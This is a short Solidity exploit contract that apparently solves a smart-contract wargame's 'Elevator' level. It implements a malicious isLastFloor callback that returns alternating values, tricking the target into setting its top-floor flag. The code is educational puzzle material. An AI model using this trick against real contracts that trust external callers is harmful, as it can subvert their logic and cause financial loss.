// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

import "./Building.sol";

contract Attacker{

    Elevator public elevator;
    bool public toggle = true;

    constructor(Elevator _elevator) public {
        elevator = _elevator;
    }

    // (toggle / true) = (!toggle / the oposite value of toggle) 
    function isLastFloor(uint) public returns(bool) {
        toggle = !toggle;
        return toggle;
    }

    function attack(uint _floor) public{
        elevator.goTo(_floor);
    }
}
